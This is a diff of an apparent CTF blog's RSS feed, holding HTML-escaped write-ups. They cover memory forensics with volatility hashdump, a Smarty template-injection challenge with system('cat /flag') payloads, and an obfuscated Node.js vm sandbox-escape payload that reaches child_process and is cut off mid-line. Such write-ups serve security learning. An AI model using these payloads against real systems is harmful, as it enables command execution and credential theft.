-&lt;p&gt;解密出password：&lt;code&gt;qwer1234&lt;/code&gt;，转换sha1即可。&lt;/p&gt;
-&lt;h2 id=&#34;隐藏的秘密&#34;&gt;隐藏的秘密&lt;/h2&gt;
-&lt;p&gt;volatility分析获得profile值，然后扫描目录&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;volatility&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-f&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;secret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;vmem&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-profile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Win2003SP2x86&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;filescan&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;发现了一个特殊的文件&lt;code&gt;\Device\HarddiskVolume1\Documents and Settings\Administrator\妗岄潰\file.txt&lt;/code&gt;(编码问题)，dump下来&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;volatility&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-f&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;secret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;vmem&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-profile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Win2003SP2x86&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dumpfiles&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Q&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;0x000000000412cde0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-dump-dir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=./&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;内容：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;什么？计算机又被不知名账户登录了？明明在计算机管理中没有这个用户，为什么还会被这个用户登录呢？电脑跟前的你能帮我找到原因吗？flag为该用户的用户名以及密码的md5值。&lt;/p&gt;
-&lt;p&gt;格式：md5(用户名:密码)&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;flag由用户名和密码组成，hashdump获取&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;volatility&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-f&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;secret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;vmem&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-profile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Win2003SP2x86&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hashdump&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;解了三个多小时的md5，还是没解到什么有用的信息，我还以为会有一个密码是&lt;strong&gt;flag在第n个&lt;/strong&gt;。。。&lt;/p&gt;
-</description>
-                
-                
-                
-                
-                
-                    
-                        
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/categories/ctf/">CTF</category>
-                                
-                            
-                        
-                    
-                        
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/tags/php/">php</category>
-                                
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</category>
-                                
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/tags/misc/">misc</category>
-                                
-                            
-                        
-                    
-                
-            </item>
-        
-            <item>
                 <title>ByteCTF2020-easy_scrapy复现</title>
                 <link>https://tyskill.github.io/posts/byte2020scrapy/</link>
                 <guid isPermaLink="true">https://tyskill.github.io/posts/byte2020scrapy/</guid>
@@ -13832,7 +12965,7 @@ HOSTNAME=72983b72e40a PYTHON_VERSION=3.8.5 PWD=/code HOME=/home/ctf ... PATH=/us
 &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;save&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1.png&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;最终结论：手撸&amp;gt;&amp;gt;脚本(×&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;最终结论：手撸&amp;gt;&amp;gt;脚本(bushi&lt;/p&gt;
 &lt;h2 id=&#34;hardcore-watermark-02&#34;&gt;Hardcore Watermark 02&lt;/h2&gt;
 &lt;h3 id=&#34;预期-1&#34;&gt;预期&lt;/h3&gt;
 &lt;p&gt;太复杂，看不懂(其实是想偷懒)&lt;/p&gt;
@@ -13895,8 +13028,8 @@ HOSTNAME=72983b72e40a PYTHON_VERSION=3.8.5 PWD=/code HOME=/home/ctf ... PATH=/us
                     <description>&lt;h2 id=&#34;解题过程&#34;&gt;解题过程&lt;/h2&gt;
 &lt;p&gt;开局一个登录框，给了一个警告：&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;注意: 你需要启用cookies才能登录或切换语言
-[10] 次连续登录失败将导致你的IP地址被禁用!&lt;/p&gt;
+&lt;p&gt;注意: 你需要启用cookies才能登录或切换语言&lt;/p&gt;
+&lt;p&gt;[10] 次连续登录失败将导致你的IP地址被禁用!&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;忽视它，直接去注册账号，发现只允许邀请注册，在&lt;code&gt;获取邀请&lt;/code&gt;按钮处可下载加密zip文件。&lt;/p&gt;
 &lt;p&gt;      根据&lt;code&gt;使用帮助&lt;/code&gt;的文档，我们可以获得一个等级为Peasant的帐号&lt;code&gt;888888&lt;/code&gt;，且文档透露了&lt;code&gt;receipt.txt&lt;/code&gt;文件的内容：(此处以帐号888888为例，账号取决于你获取链接时输入的员工账号)&lt;/p&gt;
@@ -14038,128 +13171,6 @@ md5值：BBD6FC7CC3A6E0F3B7260B2CDB24717B&lt;br&gt;
                                 
                                 
                                     <category domain="https://tyskill.github.io/tags/misc/">misc</category>
-                                
-                            
-                        
-                    
-                
-            </item>
-        
-            <item>
-                <title>BUU刷题记录-[CISCN2019华东南赛区]Web11</title>
-                <link>https://tyskill.github.io/posts/ciscn2019web11/</link>
-                <guid isPermaLink="true">https://tyskill.github.io/posts/ciscn2019web11/</guid>
-                <pubDate>Sun, 25 Oct 2020 00:00:00 &#43;0000</pubDate>
-                
-                    <author>tyskill@foxmail.com (tyskill)</author>
-                
-                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
-                
-                    <description>&lt;h2 id=&#34;smarty模板注入&#34;&gt;Smarty模板注入&lt;/h2&gt;
-&lt;h3 id=&#34;介绍&#34;&gt;介绍&lt;/h3&gt;
-&lt;p&gt;      Smarty是一个PHP的模板引擎，提供让程序逻辑与页面显示（HTML/CSS）代码分离的功能。&lt;/p&gt;
-&lt;h3 id=&#34;语法&#34;&gt;语法&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;模板定界符：&lt;code&gt;{$foo}&lt;/code&gt;, &lt;code&gt;{{$foo}}&lt;/code&gt;, &lt;code&gt;&amp;lt;!--{$foo}--&amp;gt;&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;变量表示形式：{$a}...&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;数组表示形式：{$arr.item1}...&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;模板特点&#34;&gt;模板特点&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;环境变量：&lt;a href=&#34;https://www.smarty.net/docs/zh_CN/language.variables.smarty.tpl#language.variables.smarty.config&#34;&gt;{$smarty} 保留变量&lt;/a&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;内置函数：&lt;a href=&#34;https://www.smarty.net/docs/zh_CN/language.builtin.functions.tpl&#34;&gt;内置函数&lt;/a&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;ciscn2019-华东南赛区web11&#34;&gt;[CISCN2019 华东南赛区]Web11&lt;/h2&gt;
-&lt;p&gt;      题目提供两个api：&lt;code&gt;get IP&lt;/code&gt;和&lt;code&gt;get XFF&lt;/code&gt;并在页面右上角显示，添加XFF头回显XFF内容，判断利用点在这。
-页面最底部&lt;code&gt;Build With Smarty&lt;/code&gt;字段，加上XFF传值&lt;code&gt;{1*1}&lt;/code&gt;回显1，可以确定是Smarty模板注入。&lt;/p&gt;
-&lt;p&gt;      通过&lt;code&gt;{$smarty.version}&lt;/code&gt;获得Smarty版本信息：&lt;strong&gt;3.1.30&lt;/strong&gt;，尝试&lt;code&gt;{php}{/php}&lt;/code&gt;标签，返回&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;{php}{/php} tags not allowed. Use SmartyBC to enable them&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;结合Smarty3手册中{php}说明：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;在Smarty 3.1，{php}仅在SmartyBC中可用。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;判断当前并没有使用SmartyBC类，因此我们需要别的方法调用php。&lt;/p&gt;
-&lt;p&gt;参考Smarty的&lt;strong&gt;内置函数&lt;/strong&gt;，这里有两种方法：&lt;code&gt;{if}{/if}&lt;/code&gt;和&lt;code&gt;{function}&lt;/code&gt;。&lt;/p&gt;
-&lt;h3 id=&#34;第一种ifif&#34;&gt;第一种：{if}{/if}&lt;/h3&gt;
-&lt;p&gt;手册说明：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;      Smarty的{if}条件判断和PHP的如果 非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}。也可以使用{else}和 {elseif}。&lt;strong&gt;全部的PHP条件表达式和函数都可以在if内使用&lt;/strong&gt;，如|| ，或者， &amp;amp;&amp;amp;，和， is_array（） ，等等。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;payload&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cat /flag&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)}{&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;h3 id=&#34;第二种function&#34;&gt;第二种：{function}&lt;/h3&gt;
-&lt;p&gt;手册说明：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;      模板函数是全局的。因为Smarty的编译器是单次编译的，所以必须用 {call} 标签来调用定义在当前模板的函数。 或者你可以&lt;strong&gt;直接使用函数&lt;/strong&gt;，如{funcname ...}。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;可知，我们可以直接调用php函数，如system函数，strlen函数等等。&lt;/p&gt;
-&lt;p&gt;payload&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cat /flag&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
-&lt;p&gt;&lt;a href=&#34;https://www.smarty.net/docs/zh_CN/&#34;&gt;Smarty3手册&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/column/219913.html&#34;&gt;Smarty SSTI&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_45521281/article/details/107556915&#34;&gt;PHP的模板注入（Smarty模板）&lt;/a&gt;&lt;/p&gt;
-</description>
-                
-                
-                
-                
-                
-                    
-                        
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/categories/ctf/">CTF</category>
-                                
-                            
-                        
-                    
-                        
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/tags/buuoj/">buuoj</category>
-                                
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">模板注入</category>
-                                
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/tags/php/">php</category>
                                 
                             
                         
@@ -14872,7 +13883,7 @@ md5值：BBD6FC7CC3A6E0F3B7260B2CDB24717B&lt;br&gt;
                 
                 <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                 
-                    <description>&lt;h1 id=&#34;gyctf2020ez_express&#34;&gt;[GYCTF2020]Ez_Express&lt;/h1&gt;
+                    <description>&lt;h2 id=&#34;gyctf2020ez_express&#34;&gt;[GYCTF2020]Ez_Express&lt;/h2&gt;
 &lt;p&gt;首页一个登录框和一个提示框，提示框内容：&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;友情提示&lt;br&gt;
@@ -14956,7 +13967,7 @@ md5值：BBD6FC7CC3A6E0F3B7260B2CDB24717B&lt;br&gt;
       child_process.exec() 返回: &lt;code&gt;&amp;lt;ChildProcess&amp;gt;&lt;/code&gt;&lt;br&gt;
       child_process.execSync() 返回: &lt;code&gt;&amp;lt;Buffer&amp;gt;&lt;/code&gt; | &lt;code&gt;&amp;lt;string&amp;gt;&lt;/code&gt; 命令的 stdout。&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h1 id=&#34;hfctf2020justescape&#34;&gt;[HFCTF2020]JustEscape&lt;/h1&gt;
+&lt;h2 id=&#34;hfctf2020justescape&#34;&gt;[HFCTF2020]JustEscape&lt;/h2&gt;
 &lt;p&gt;主页面提示信息：&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;真的是 PHP 嘛 \&lt;/p&gt;
@@ -15062,7 +14073,7 @@ md5值：BBD6FC7CC3A6E0F3B7260B2CDB24717B&lt;br&gt;
 &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(()=&amp;gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;TypeError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[[&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`p`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`r`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`o`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`t`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`o`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`t`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`y`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`p`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`e`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`join`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;``&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)][&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`a`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[[&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`c`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`o`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`n`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`s`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`t`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`r`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`u`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`c`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`t`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`o`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`r`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`join`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;``&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)]([&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`r`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`e`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`t`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`u`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`r`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`n`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;` `&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`p`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`r`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`o`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`c`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`e`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`s`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`s`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`join`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;``&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))();&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`preventExtensions`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`from`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;``&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))[&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`a`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`a`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](()=&amp;gt;{})[&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`mainModule`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][[&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`r`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`e`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`q`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`u`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`i`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`r`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`e`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`join`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;``&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)]([&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`c`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`h`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`i`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`l`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`d`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`_`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`p`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`r`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`o`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`c`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span 